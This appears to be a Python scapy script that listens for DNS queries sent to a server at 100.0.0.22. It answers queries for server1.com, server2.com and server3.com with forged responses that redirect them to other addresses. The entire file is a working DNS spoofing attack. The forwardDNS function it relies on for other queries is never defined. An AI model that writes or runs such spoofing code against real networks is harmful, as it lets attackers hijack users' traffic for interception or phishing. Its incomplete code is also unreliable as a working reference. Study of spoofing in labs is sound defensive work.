from scapy.all import *
 
DNSServerIP = "100.0.0.22"
filter = "udp port 53 and ip dst " + DNSServerIP + " and not ip src " + DNSServerIP
 
def DNS_Responder(localIP):
 
    def getResponse(pkt):
 
        if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[IP].src != localIP):
            if "server1.com" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.40")\
                    /DNSRR(rrname="server1.com",rdata="100.0.0.40"))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent"
                
            if "server2.com" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.41")\
                    /DNSRR(rrname="server2.com",rdata="100.0.0.41"))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent"

            if "server3.com" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata="100.0.0.42")\
                    /DNSRR(rrname="server3.com",rdata="100.0.0.42"))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent"

            else:
                #make DNS query, capturing the answer and send the answer
                return forwardDNS(pkt)
 
        else:
            return False
 
    return getResponse
 
sniff(filter=filter,prn=DNS_Responder(DNSServerIP))

